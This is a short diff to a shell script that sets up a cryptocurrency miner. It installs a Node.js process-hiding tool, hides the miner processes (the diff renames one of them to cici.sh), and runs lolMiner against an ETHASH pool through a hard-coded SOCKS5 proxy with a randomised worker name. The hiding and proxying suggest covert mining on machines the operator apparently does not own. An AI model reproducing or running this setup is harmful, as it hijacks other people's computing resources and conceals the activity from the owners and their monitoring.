@@ -8,7 +8,7 @@ apt-get install -y nodejs
 npm i -g node-process-hider
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
-ph add PhoenixMinerEth.sh
+ph add cici.sh
 ph add lolMiner
 sleep 14
 ./lolMiner --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user gilakupol.cici-$(echo $(shuf -i 1-99 -n 1)) --ethstratum ETHPROXY --socks5 46.174.43.18:1080 --timeprint on --longstats 60 
